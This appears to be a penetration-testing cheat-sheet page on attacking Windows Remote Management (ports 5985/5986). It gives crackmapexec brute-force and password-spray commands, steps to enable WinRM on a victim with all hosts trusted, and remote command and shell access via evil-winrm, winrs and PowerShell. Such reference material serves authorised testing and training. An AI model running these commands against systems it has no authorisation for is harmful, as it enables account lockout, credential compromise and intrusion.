---
description: Port 5985,5986
---

# WinRM

## Theory

Windows Remote Management (WinRM) is a Microsoft protocol that **allows remote management of Windows machines** over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.\
If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)\
The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports: **5985/tcp (HTTP) or 5986/tcp (HTTPS)**

## **Practice**

### Targeting Accounts

{% tabs %}
{% tab title="Bruteforce" %}
Be careful, brute-forcing winrm could block users.

```bash
crackmapexec winrm <IP> -d <Domain Name> -u <userlist> -p <passwlist>
```
{% endtab %}

{% tab title="Password Spray" %}
We can use following command to password spray

```bash
crackmapexec winrm <IP> -d <Domain Name> -u <userlist> -p 'Passw0rd!'
```
{% endtab %}
{% endtabs %}

### Enable WinRM

Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector. However, for instances where this is not the case, we can enable it using powershell

{% tabs %}
{% tab title="Enable WinRM" %}
If we have access to an **elevated PowerShell** prompt on the victim, we cam enable it and add any "attackers" as trusted hosts. We can run the following two commands

```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```

We can also **activate** WinRM **remotely** using wmic

```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
{% endtab %}

{% tab title="Check configuration" %}
use the `Test-WSMan` function to test whether the target is configured for WinRM. You should see some information returned about the protocol version and wsmid:

```powershell
#Check locally
Test-WSMan

#Check remotely
Test-WSMan -ComputerName <TARGET>
```
{% endtab %}
{% endtabs %}

### Execute Remote Commands

{% tabs %}
{% tab title="UNIX-like" %}
We can use [crackmapexec](https://github.com/mpgn/CrackMapExec) to remotely execute a command on the target over WinRM.

```bash
#Execute command
crackmapexec winrm <IP> -u <user> -p <password> -x "whoami"

#Execute PowerShell command
crackmapexec winrm <IP> -u <user> -p <password> -x "$(Get-WMIObject -class Win32_ComputerSystem | select username).username"
```
{% endtab %}

{% tab title="Windows" %}
We can use PowerShell's `Invoke-Command` to remotely execute a command on the target over WinRM.

```powershell
#Create Powershell PSCredential object
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

#Invoke command remotly
Invoke-Command -Computername <TARGET> -Credential $credential -ScriptBlock {whoami}

#Invoke command remotly from functions of your current PS console (like imported modules)
Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```

You may also run scripts using WInRM

```powershell
Invoke-Command -ComputerName <TARGET> -FilePath C:\path\to\script\file -credential $credential
```
{% endtab %}
{% endtabs %}

### Remote shell

{% tabs %}
{% tab title="UNIX-like" %}
[Evil-winrm](https://github.com/Hackplayers/evil-winrm) can be use to obtain a winrm powershell session

```bash
evil-winrm -u <user> -p <password> -i <IP>
```
{% endtab %}

{% tab title="Windows" %}
We can use the WinRs binary

```powershell
#Winrm Binary
winrs.exe -u:Administrator -p:Mypass123 -r:10.10.10.10 cmd
```

Or we can do the same with PowerShell

```powershell
#Create PowerShell PSCredential object
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

#Now we can create an interactive session or Invoke-Command remotly
#Interactive Session
Enter-PSSession -Computername <TARGET> -Credential $credential

#Interactive Session & Bypass proxy
Enter-PSSession -ComputerName <TARGET> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
```
{% endtab %}
{% endtabs %}

## **Resources**

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm" %}
